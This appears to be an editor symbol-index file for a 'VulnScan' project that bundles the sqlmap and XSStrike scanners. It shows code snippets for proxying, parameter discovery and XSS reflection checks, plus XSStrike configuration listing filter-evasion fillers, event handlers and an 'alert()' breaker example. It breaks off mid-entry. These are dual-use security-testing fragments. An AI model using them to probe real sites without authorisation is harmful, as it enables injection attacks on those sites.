        "peekOfCode": "_defaultproxy = None\nsocket._orig_socket = _orgsocket = _orig_socket = socket.socket\n_orgcreateconnection = socket.create_connection\nclass ProxyError(Exception): pass\nclass GeneralProxyError(ProxyError): pass\nclass Socks5AuthError(ProxyError): pass\nclass Socks5Error(ProxyError): pass\nclass Socks4Error(ProxyError): pass\nclass HTTPError(ProxyError): pass\n_generalerrors = (\"success\",",
        "detail": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "documentation": {}
    },
    {
        "label": "socket._orig_socket",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "description": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "peekOfCode": "socket._orig_socket = _orgsocket = _orig_socket = socket.socket\n_orgcreateconnection = socket.create_connection\nclass ProxyError(Exception): pass\nclass GeneralProxyError(ProxyError): pass\nclass Socks5AuthError(ProxyError): pass\nclass Socks5Error(ProxyError): pass\nclass Socks4Error(ProxyError): pass\nclass HTTPError(ProxyError): pass\n_generalerrors = (\"success\",\n    \"invalid data\",",
        "detail": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "documentation": {}
    },
    {
        "label": "_orgcreateconnection",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "description": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "peekOfCode": "_orgcreateconnection = socket.create_connection\nclass ProxyError(Exception): pass\nclass GeneralProxyError(ProxyError): pass\nclass Socks5AuthError(ProxyError): pass\nclass Socks5Error(ProxyError): pass\nclass Socks4Error(ProxyError): pass\nclass HTTPError(ProxyError): pass\n_generalerrors = (\"success\",\n    \"invalid data\",\n    \"not connected\",",
        "detail": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "documentation": {}
    },
    {
        "label": "_generalerrors",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "description": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "peekOfCode": "_generalerrors = (\"success\",\n    \"invalid data\",\n    \"not connected\",\n    \"not available\",\n    \"bad proxy type\",\n    \"bad input\")\n_socks5errors = (\"succeeded\",\n    \"general SOCKS server failure\",\n    \"connection not allowed by ruleset\",\n    \"Network unreachable\",",
        "detail": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "documentation": {}
    },
    {
        "label": "_socks5errors",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "description": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "peekOfCode": "_socks5errors = (\"succeeded\",\n    \"general SOCKS server failure\",\n    \"connection not allowed by ruleset\",\n    \"Network unreachable\",\n    \"Host unreachable\",\n    \"Connection refused\",\n    \"TTL expired\",\n    \"Command not supported\",\n    \"Address type not supported\",\n    \"Unknown error\")",
        "detail": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "documentation": {}
    },
    {
        "label": "_socks5autherrors",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "description": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "peekOfCode": "_socks5autherrors = (\"succeeded\",\n    \"authentication is required\",\n    \"all offered authentication methods were rejected\",\n    \"unknown username or invalid password\",\n    \"unknown error\")\n_socks4errors = (\"request granted\",\n    \"request rejected or failed\",\n    \"request rejected because SOCKS server cannot connect to identd on the client\",\n    \"request rejected because the client program and identd report different user-ids\",\n    \"unknown error\")",
        "detail": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "documentation": {}
    },
    {
        "label": "_socks4errors",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "description": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "peekOfCode": "_socks4errors = (\"request granted\",\n    \"request rejected or failed\",\n    \"request rejected because SOCKS server cannot connect to identd on the client\",\n    \"request rejected because the client program and identd report different user-ids\",\n    \"unknown error\")\ndef setdefaultproxy(proxytype=None, addr=None, port=None, rdns=True, username=None, password=None):\n    \"\"\"setdefaultproxy(proxytype, addr[, port[, rdns[, username[, password]]]])\n    Sets a default proxy which all further socksocket objects will use,\n    unless explicitly changed.\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "documentation": {}
    },
    {
        "label": "colored",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "description": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "peekOfCode": "def colored(text, color=None, on_color=None, attrs=None):\n    \"\"\"Colorize text.\n    Available text colors:\n        red, green, yellow, blue, magenta, cyan, white.\n    Available text highlights:\n        on_red, on_green, on_yellow, on_blue, on_magenta, on_cyan, on_white.\n    Available attributes:\n        bold, dark, underline, blink, reverse, concealed.\n    Example:\n        colored('Hello, World!', 'red', 'on_grey', ['blue', 'blink'])",
        "detail": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "documentation": {}
    },
    {
        "label": "cprint",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "description": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "peekOfCode": "def cprint(text, color=None, on_color=None, attrs=None, **kwargs):\n    \"\"\"Print colorize text.\n    It accepts arguments of print function.\n    \"\"\"\n    print((colored(text, color, on_color, attrs)), **kwargs)\nif __name__ == '__main__':\n    print('Current terminal type: %s' % os.getenv('TERM'))\n    print('Test basic colors:')\n    cprint('Grey color', 'grey')\n    cprint('Red color', 'red')",
        "detail": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "documentation": {}
    },
    {
        "label": "__ALL__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "description": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "peekOfCode": "__ALL__ = [ 'colored', 'cprint' ]\nVERSION = (1, 1, 0)\nATTRIBUTES = dict(\n        list(zip([\n            'bold',\n            'dark',\n            '',\n            'underline',\n            'blink',\n            '',",
        "detail": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "documentation": {}
    },
    {
        "label": "VERSION",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "description": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "peekOfCode": "VERSION = (1, 1, 0)\nATTRIBUTES = dict(\n        list(zip([\n            'bold',\n            'dark',\n            '',\n            'underline',\n            'blink',\n            '',\n            'reverse',",
        "detail": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "documentation": {}
    },
    {
        "label": "ATTRIBUTES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "description": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "peekOfCode": "ATTRIBUTES = dict(\n        list(zip([\n            'bold',\n            'dark',\n            '',\n            'underline',\n            'blink',\n            '',\n            'reverse',\n            'concealed'",
        "detail": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "documentation": {}
    },
    {
        "label": "HIGHLIGHTS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "description": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "peekOfCode": "HIGHLIGHTS = dict(\n        list(zip([\n            'on_grey',\n            'on_red',\n            'on_green',\n            'on_yellow',\n            'on_blue',\n            'on_magenta',\n            'on_cyan',\n            'on_white'",
        "detail": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "documentation": {}
    },
    {
        "label": "COLORS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "description": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "peekOfCode": "COLORS = dict(\n        list(zip([\n            'grey',\n            'red',\n            'green',\n            'yellow',\n            'blue',\n            'magenta',\n            'cyan',\n            'white',",
        "detail": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "documentation": {}
    },
    {
        "label": "COLORS[\"lightgrey\"]",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "description": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "peekOfCode": "COLORS[\"lightgrey\"] = 37\nCOLORS[\"darkgrey\"] = 90\nRESET = '\\033[0m'\ndef colored(text, color=None, on_color=None, attrs=None):\n    \"\"\"Colorize text.\n    Available text colors:\n        red, green, yellow, blue, magenta, cyan, white.\n    Available text highlights:\n        on_red, on_green, on_yellow, on_blue, on_magenta, on_cyan, on_white.\n    Available attributes:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "documentation": {}
    },
    {
        "label": "COLORS[\"darkgrey\"]",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "description": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "peekOfCode": "COLORS[\"darkgrey\"] = 90\nRESET = '\\033[0m'\ndef colored(text, color=None, on_color=None, attrs=None):\n    \"\"\"Colorize text.\n    Available text colors:\n        red, green, yellow, blue, magenta, cyan, white.\n    Available text highlights:\n        on_red, on_green, on_yellow, on_blue, on_magenta, on_cyan, on_white.\n    Available attributes:\n        bold, dark, underline, blink, reverse, concealed.",
        "detail": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "documentation": {}
    },
    {
        "label": "RESET",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "description": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "peekOfCode": "RESET = '\\033[0m'\ndef colored(text, color=None, on_color=None, attrs=None):\n    \"\"\"Colorize text.\n    Available text colors:\n        red, green, yellow, blue, magenta, cyan, white.\n    Available text highlights:\n        on_red, on_green, on_yellow, on_blue, on_magenta, on_cyan, on_white.\n    Available attributes:\n        bold, dark, underline, blink, reverse, concealed.\n    Example:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.termcolor.termcolor",
        "documentation": {}
    },
    {
        "label": "sockaddr",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.wininetpton.win_inet_pton",
        "description": "VulnScan.modules.sqlmap.thirdparty.wininetpton.win_inet_pton",
        "peekOfCode": "class sockaddr(ctypes.Structure):\n    _fields_ = [(\"sa_family\", ctypes.c_short),\n                (\"__pad1\", ctypes.c_ushort),\n                (\"ipv4_addr\", ctypes.c_byte * 4),\n                (\"ipv6_addr\", ctypes.c_byte * 16),\n                (\"__pad2\", ctypes.c_ulong)]\nif hasattr(ctypes, 'windll'):\n    WSAStringToAddressA = ctypes.windll.ws2_32.WSAStringToAddressA\n    WSAAddressToStringA = ctypes.windll.ws2_32.WSAAddressToStringA\nelse:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.wininetpton.win_inet_pton",
        "documentation": {}
    },
    {
        "label": "inet_pton",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.wininetpton.win_inet_pton",
        "description": "VulnScan.modules.sqlmap.thirdparty.wininetpton.win_inet_pton",
        "peekOfCode": "def inet_pton(address_family, ip_string):\n    addr = sockaddr()\n    addr.sa_family = address_family\n    addr_size = ctypes.c_int(ctypes.sizeof(addr))\n    if WSAStringToAddressA(\n            ip_string,\n            address_family,\n            None,\n            ctypes.byref(addr),\n            ctypes.byref(addr_size)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.wininetpton.win_inet_pton",
        "documentation": {}
    },
    {
        "label": "inet_ntop",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.wininetpton.win_inet_pton",
        "description": "VulnScan.modules.sqlmap.thirdparty.wininetpton.win_inet_pton",
        "peekOfCode": "def inet_ntop(address_family, packed_ip):\n    addr = sockaddr()\n    addr.sa_family = address_family\n    addr_size = ctypes.c_int(ctypes.sizeof(addr))\n    ip_string = ctypes.create_string_buffer(128)\n    ip_string_size = ctypes.c_int(ctypes.sizeof(ip_string))\n    if address_family == socket.AF_INET:\n        if len(packed_ip) != ctypes.sizeof(addr.ipv4_addr):\n            raise socket.error('packed IP wrong length for inet_ntoa')\n        ctypes.memmove(addr.ipv4_addr, packed_ip, 4)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.wininetpton.win_inet_pton",
        "documentation": {}
    },
    {
        "label": "modulePath",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.sqlmap",
        "description": "VulnScan.modules.sqlmap.sqlmap",
        "peekOfCode": "def modulePath():\n    \"\"\"\n    This will get us the program's directory, even if we are frozen\n    using py2exe\n    \"\"\"\n    try:\n        _ = sys.executable if weAreFrozen() else __file__\n    except NameError:\n        _ = inspect.getsourcefile(modulePath)\n    return getUnicode(os.path.dirname(os.path.realpath(_)), encoding=sys.getfilesystemencoding() or UNICODE_ENCODING)",
        "detail": "VulnScan.modules.sqlmap.sqlmap",
        "documentation": {}
    },
    {
        "label": "checkEnvironment",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.sqlmap",
        "description": "VulnScan.modules.sqlmap.sqlmap",
        "peekOfCode": "def checkEnvironment():\n    try:\n        os.path.isdir(modulePath())\n    except UnicodeEncodeError:\n        errMsg = \"your system does not properly handle non-ASCII paths. \"\n        errMsg += \"Please move the sqlmap's directory to the other location\"\n        logger.critical(errMsg)\n        raise SystemExit\n    if LooseVersion(VERSION) < LooseVersion(\"1.0\"):\n        errMsg = \"your runtime environment (e.g. PYTHONPATH) is \"",
        "detail": "VulnScan.modules.sqlmap.sqlmap",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.sqlmap",
        "description": "VulnScan.modules.sqlmap.sqlmap",
        "peekOfCode": "def main():\n    \"\"\"\n    Main function of sqlmap when running from command line.\n    \"\"\"\n    try:\n        dirtyPatches()\n        resolveCrossReferences()\n        checkEnvironment()\n        setPaths(modulePath())\n        # banner()",
        "detail": "VulnScan.modules.sqlmap.sqlmap",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.sqlmapapi",
        "description": "VulnScan.modules.sqlmap.sqlmapapi",
        "peekOfCode": "def main():\n    \"\"\"\n    REST-JSON API main function\n    \"\"\"\n    dirtyPatches()\n    resolveCrossReferences()\n    # Set default logging level to debug\n    logger.setLevel(logging.DEBUG)\n    # Initialize paths\n    setPaths(modulePath())",
        "detail": "VulnScan.modules.sqlmap.sqlmapapi",
        "documentation": {}
    },
    {
        "label": "sys.dont_write_bytecode",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.sqlmapapi",
        "description": "VulnScan.modules.sqlmap.sqlmapapi",
        "peekOfCode": "sys.dont_write_bytecode = True\n__import__(\"lib.utils.versioncheck\")  # this has to be the first non-standard import\nimport logging\nimport optparse\nimport os\nimport warnings\nwarnings.filterwarnings(action=\"ignore\", category=UserWarning)\nwarnings.filterwarnings(action=\"ignore\", category=DeprecationWarning)\nfrom lib.core.common import getUnicode\nfrom lib.core.common import setPaths",
        "detail": "VulnScan.modules.sqlmap.sqlmapapi",
        "documentation": {}
    },
    {
        "label": "checky",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.arjun",
        "description": "VulnScan.modules.xss-strike.core.arjun",
        "peekOfCode": "def checky(param, paraNames, url, headers, GET, delay, timeout):\n    if param not in paraNames:\n        logger.debug(\"Checking param: {}\".format(param))\n        response = requester(\n            url, {param: xsschecker}, headers, GET, delay, timeout\n        ).text\n        if (\n            \"'%s'\" % xsschecker in response\n            or '\"%s\"' % xsschecker in response\n            or \" %s \" % xsschecker in response",
        "detail": "VulnScan.modules.xss-strike.core.arjun",
        "documentation": {}
    },
    {
        "label": "arjun",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.arjun",
        "description": "VulnScan.modules.xss-strike.core.arjun",
        "peekOfCode": "def arjun(url, GET, headers, delay, timeout):\n    paraNames = {}\n    response = requester(url, {}, headers, GET, delay, timeout).text\n    matches = re.findall(\n        r'<input.*?name=\\'(.*?)\\'.*?>|<input.*?name=\"(.*?)\".*?>', response\n    )\n    for match in matches:\n        try:\n            foundParam = match[1]\n        except UnicodeDecodeError:",
        "detail": "VulnScan.modules.xss-strike.core.arjun",
        "documentation": {}
    },
    {
        "label": "logger",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.arjun",
        "description": "VulnScan.modules.xss-strike.core.arjun",
        "peekOfCode": "logger = setup_logger(__name__)\ndef checky(param, paraNames, url, headers, GET, delay, timeout):\n    if param not in paraNames:\n        logger.debug(\"Checking param: {}\".format(param))\n        response = requester(\n            url, {param: xsschecker}, headers, GET, delay, timeout\n        ).text\n        if (\n            \"'%s'\" % xsschecker in response\n            or '\"%s\"' % xsschecker in response",
        "detail": "VulnScan.modules.xss-strike.core.arjun",
        "documentation": {}
    },
    {
        "label": "checker",
        "kind": 2,
        "importPath": "VulnScan.modules.xss-strike.core.checker",
        "description": "VulnScan.modules.xss-strike.core.checker",
        "peekOfCode": "def checker(url, params, headers, GET, delay, payload, positions, timeout, encoding):\n    checkString = \"st4r7s\" + payload + \"3nd\"\n    if encoding:\n        checkString = encoding(unquote(checkString))\n    response = requester(\n        url,\n        replaceValue(params, xsschecker, checkString, copy.deepcopy),\n        headers,\n        GET,\n        delay,",
        "detail": "VulnScan.modules.xss-strike.core.checker",
        "documentation": {}
    },
    {
        "label": "colors",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.colors",
        "description": "VulnScan.modules.xss-strike.core.colors",
        "peekOfCode": "colors = True  # Output should be colored\nmachine = sys.platform  # Detecting the os of current system\ncheckplatform = platform.platform()  # Get current version of OS\nif machine.lower().startswith((\"os\", \"win\", \"darwin\", \"ios\")):\n    colors = False  # Colors shouldn't be displayed on mac & windows\nif (\n    checkplatform.startswith(\"Windows-10\")\n    and int(platform.version().split(\".\")[2]) >= 10586\n):\n    colors = False",
        "detail": "VulnScan.modules.xss-strike.core.colors",
        "documentation": {}
    },
    {
        "label": "machine",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.colors",
        "description": "VulnScan.modules.xss-strike.core.colors",
        "peekOfCode": "machine = sys.platform  # Detecting the os of current system\ncheckplatform = platform.platform()  # Get current version of OS\nif machine.lower().startswith((\"os\", \"win\", \"darwin\", \"ios\")):\n    colors = False  # Colors shouldn't be displayed on mac & windows\nif (\n    checkplatform.startswith(\"Windows-10\")\n    and int(platform.version().split(\".\")[2]) >= 10586\n):\n    colors = False\n    os.system(\"\")  # Enables the ANSI",
        "detail": "VulnScan.modules.xss-strike.core.colors",
        "documentation": {}
    },
    {
        "label": "checkplatform",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.colors",
        "description": "VulnScan.modules.xss-strike.core.colors",
        "peekOfCode": "checkplatform = platform.platform()  # Get current version of OS\nif machine.lower().startswith((\"os\", \"win\", \"darwin\", \"ios\")):\n    colors = False  # Colors shouldn't be displayed on mac & windows\nif (\n    checkplatform.startswith(\"Windows-10\")\n    and int(platform.version().split(\".\")[2]) >= 10586\n):\n    colors = False\n    os.system(\"\")  # Enables the ANSI\nif not colors:",
        "detail": "VulnScan.modules.xss-strike.core.colors",
        "documentation": {}
    },
    {
        "label": "changes",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.config",
        "description": "VulnScan.modules.xss-strike.core.config",
        "peekOfCode": "changes = \"\"\"Negligible DOM XSS false positives;x10 faster crawling\"\"\"\nglobalVariables = (\n    {}\n)  # it holds variables during runtime for collaboration across modules\ndefaultEditor = \"nano\"\nblindPayload = \"\"  # your blind XSS payload\nxsschecker = \"v3dm0s\"  # A non malicious string to check for reflections and stuff\n#  More information on adding proxies: http://docs.python-requests.org/en/master/user/advanced/#proxies\nproxies = {\"http\": \"http://0.0.0.0:8080\", \"https\": \"http://0.0.0.0:8080\"}\nminEfficiency = 90  # payloads below this efficiency will not be displayed",
        "detail": "VulnScan.modules.xss-strike.core.config",
        "documentation": {}
    },
    {
        "label": "globalVariables",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.config",
        "description": "VulnScan.modules.xss-strike.core.config",
        "peekOfCode": "globalVariables = (\n    {}\n)  # it holds variables during runtime for collaboration across modules\ndefaultEditor = \"nano\"\nblindPayload = \"\"  # your blind XSS payload\nxsschecker = \"v3dm0s\"  # A non malicious string to check for reflections and stuff\n#  More information on adding proxies: http://docs.python-requests.org/en/master/user/advanced/#proxies\nproxies = {\"http\": \"http://0.0.0.0:8080\", \"https\": \"http://0.0.0.0:8080\"}\nminEfficiency = 90  # payloads below this efficiency will not be displayed\ndelay = 0  # default delay between http requests",
        "detail": "VulnScan.modules.xss-strike.core.config",
        "documentation": {}
    },
    {
        "label": "defaultEditor",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.config",
        "description": "VulnScan.modules.xss-strike.core.config",
        "peekOfCode": "defaultEditor = \"nano\"\nblindPayload = \"\"  # your blind XSS payload\nxsschecker = \"v3dm0s\"  # A non malicious string to check for reflections and stuff\n#  More information on adding proxies: http://docs.python-requests.org/en/master/user/advanced/#proxies\nproxies = {\"http\": \"http://0.0.0.0:8080\", \"https\": \"http://0.0.0.0:8080\"}\nminEfficiency = 90  # payloads below this efficiency will not be displayed\ndelay = 0  # default delay between http requests\nthreadCount = 10  # default number of threads\ntimeout = 10  # default number of http request timeout\n# attributes that have special properties",
        "detail": "VulnScan.modules.xss-strike.core.config",
        "documentation": {}
    },
    {
        "label": "blindPayload",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.config",
        "description": "VulnScan.modules.xss-strike.core.config",
        "peekOfCode": "blindPayload = \"\"  # your blind XSS payload\nxsschecker = \"v3dm0s\"  # A non malicious string to check for reflections and stuff\n#  More information on adding proxies: http://docs.python-requests.org/en/master/user/advanced/#proxies\nproxies = {\"http\": \"http://0.0.0.0:8080\", \"https\": \"http://0.0.0.0:8080\"}\nminEfficiency = 90  # payloads below this efficiency will not be displayed\ndelay = 0  # default delay between http requests\nthreadCount = 10  # default number of threads\ntimeout = 10  # default number of http request timeout\n# attributes that have special properties\nspecialAttributes = [\"srcdoc\", \"src\"]",
        "detail": "VulnScan.modules.xss-strike.core.config",
        "documentation": {}
    },
    {
        "label": "xsschecker",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.config",
        "description": "VulnScan.modules.xss-strike.core.config",
        "peekOfCode": "xsschecker = \"v3dm0s\"  # A non malicious string to check for reflections and stuff\n#  More information on adding proxies: http://docs.python-requests.org/en/master/user/advanced/#proxies\nproxies = {\"http\": \"http://0.0.0.0:8080\", \"https\": \"http://0.0.0.0:8080\"}\nminEfficiency = 90  # payloads below this efficiency will not be displayed\ndelay = 0  # default delay between http requests\nthreadCount = 10  # default number of threads\ntimeout = 10  # default number of http request timeout\n# attributes that have special properties\nspecialAttributes = [\"srcdoc\", \"src\"]\nbadTags = (\"iframe\", \"title\", \"textarea\", \"noembed\", \"style\", \"template\", \"noscript\")",
        "detail": "VulnScan.modules.xss-strike.core.config",
        "documentation": {}
    },
    {
        "label": "proxies",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.config",
        "description": "VulnScan.modules.xss-strike.core.config",
        "peekOfCode": "proxies = {\"http\": \"http://0.0.0.0:8080\", \"https\": \"http://0.0.0.0:8080\"}\nminEfficiency = 90  # payloads below this efficiency will not be displayed\ndelay = 0  # default delay between http requests\nthreadCount = 10  # default number of threads\ntimeout = 10  # default number of http request timeout\n# attributes that have special properties\nspecialAttributes = [\"srcdoc\", \"src\"]\nbadTags = (\"iframe\", \"title\", \"textarea\", \"noembed\", \"style\", \"template\", \"noscript\")\ntags = (\"html\", \"d3v\", \"a\", \"details\")  # HTML Tags\n# \"Things\" that can be used between js functions and breakers e.g. '};alert()//",
        "detail": "VulnScan.modules.xss-strike.core.config",
        "documentation": {}
    },
    {
        "label": "minEfficiency",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.config",
        "description": "VulnScan.modules.xss-strike.core.config",
        "peekOfCode": "minEfficiency = 90  # payloads below this efficiency will not be displayed\ndelay = 0  # default delay between http requests\nthreadCount = 10  # default number of threads\ntimeout = 10  # default number of http request timeout\n# attributes that have special properties\nspecialAttributes = [\"srcdoc\", \"src\"]\nbadTags = (\"iframe\", \"title\", \"textarea\", \"noembed\", \"style\", \"template\", \"noscript\")\ntags = (\"html\", \"d3v\", \"a\", \"details\")  # HTML Tags\n# \"Things\" that can be used between js functions and breakers e.g. '};alert()//\njFillings = \";\"",
        "detail": "VulnScan.modules.xss-strike.core.config",
        "documentation": {}
    },
    {
        "label": "delay",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.config",
        "description": "VulnScan.modules.xss-strike.core.config",
        "peekOfCode": "delay = 0  # default delay between http requests\nthreadCount = 10  # default number of threads\ntimeout = 10  # default number of http request timeout\n# attributes that have special properties\nspecialAttributes = [\"srcdoc\", \"src\"]\nbadTags = (\"iframe\", \"title\", \"textarea\", \"noembed\", \"style\", \"template\", \"noscript\")\ntags = (\"html\", \"d3v\", \"a\", \"details\")  # HTML Tags\n# \"Things\" that can be used between js functions and breakers e.g. '};alert()//\njFillings = \";\"\n# \"Things\" that can be used before > e.g. <tag attr=value%0dx>",
        "detail": "VulnScan.modules.xss-strike.core.config",
        "documentation": {}
    },
    {
        "label": "threadCount",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.config",
        "description": "VulnScan.modules.xss-strike.core.config",
        "peekOfCode": "threadCount = 10  # default number of threads\ntimeout = 10  # default number of http request timeout\n# attributes that have special properties\nspecialAttributes = [\"srcdoc\", \"src\"]\nbadTags = (\"iframe\", \"title\", \"textarea\", \"noembed\", \"style\", \"template\", \"noscript\")\ntags = (\"html\", \"d3v\", \"a\", \"details\")  # HTML Tags\n# \"Things\" that can be used between js functions and breakers e.g. '};alert()//\njFillings = \";\"\n# \"Things\" that can be used before > e.g. <tag attr=value%0dx>\nlFillings = (\"\", \"%0dx\")",
        "detail": "VulnScan.modules.xss-strike.core.config",
        "documentation": {}
    },
    {
        "label": "timeout",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.config",
        "description": "VulnScan.modules.xss-strike.core.config",
        "peekOfCode": "timeout = 10  # default number of http request timeout\n# attributes that have special properties\nspecialAttributes = [\"srcdoc\", \"src\"]\nbadTags = (\"iframe\", \"title\", \"textarea\", \"noembed\", \"style\", \"template\", \"noscript\")\ntags = (\"html\", \"d3v\", \"a\", \"details\")  # HTML Tags\n# \"Things\" that can be used between js functions and breakers e.g. '};alert()//\njFillings = \";\"\n# \"Things\" that can be used before > e.g. <tag attr=value%0dx>\nlFillings = (\"\", \"%0dx\")\n# \"Things\" to use between event handler and = or between function and =",
        "detail": "VulnScan.modules.xss-strike.core.config",
        "documentation": {}
    },
    {
        "label": "specialAttributes",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.config",
        "description": "VulnScan.modules.xss-strike.core.config",
        "peekOfCode": "specialAttributes = [\"srcdoc\", \"src\"]\nbadTags = (\"iframe\", \"title\", \"textarea\", \"noembed\", \"style\", \"template\", \"noscript\")\ntags = (\"html\", \"d3v\", \"a\", \"details\")  # HTML Tags\n# \"Things\" that can be used between js functions and breakers e.g. '};alert()//\njFillings = \";\"\n# \"Things\" that can be used before > e.g. <tag attr=value%0dx>\nlFillings = (\"\", \"%0dx\")\n# \"Things\" to use between event handler and = or between function and =\neFillings = (\"%09\", \"%0a\", \"%0d\", \"+\")\nfillings = (\"%09\", \"%0a\", \"%0d\", \"/+/\")  # \"Things\" to use instead of space",
        "detail": "VulnScan.modules.xss-strike.core.config",
        "documentation": {}
    },
    {
        "label": "badTags",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.config",
        "description": "VulnScan.modules.xss-strike.core.config",
        "peekOfCode": "badTags = (\"iframe\", \"title\", \"textarea\", \"noembed\", \"style\", \"template\", \"noscript\")\ntags = (\"html\", \"d3v\", \"a\", \"details\")  # HTML Tags\n# \"Things\" that can be used between js functions and breakers e.g. '};alert()//\njFillings = \";\"\n# \"Things\" that can be used before > e.g. <tag attr=value%0dx>\nlFillings = (\"\", \"%0dx\")\n# \"Things\" to use between event handler and = or between function and =\neFillings = (\"%09\", \"%0a\", \"%0d\", \"+\")\nfillings = (\"%09\", \"%0a\", \"%0d\", \"/+/\")  # \"Things\" to use instead of space\neventHandlers = {  # Event handlers and the tags compatible with them",
        "detail": "VulnScan.modules.xss-strike.core.config",
        "documentation": {}
    },
    {
        "label": "tags",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.config",
        "description": "VulnScan.modules.xss-strike.core.config",
        "peekOfCode": "tags = (\"html\", \"d3v\", \"a\", \"details\")  # HTML Tags\n# \"Things\" that can be used between js functions and breakers e.g. '};alert()//\njFillings = \";\"\n# \"Things\" that can be used before > e.g. <tag attr=value%0dx>\nlFillings = (\"\", \"%0dx\")\n# \"Things\" to use between event handler and = or between function and =\neFillings = (\"%09\", \"%0a\", \"%0d\", \"+\")\nfillings = (\"%09\", \"%0a\", \"%0d\", \"/+/\")  # \"Things\" to use instead of space\neventHandlers = {  # Event handlers and the tags compatible with them\n    \"ontoggle\": [\"details\"],",
        "detail": "VulnScan.modules.xss-strike.core.config",
        "documentation": {}
    },
    {
        "label": "jFillings",
        "kind": 5,
        "importPath": "VulnScan.modules.xss-strike.core.config",
        "description": "VulnScan.modules.xss-strike.core.config",
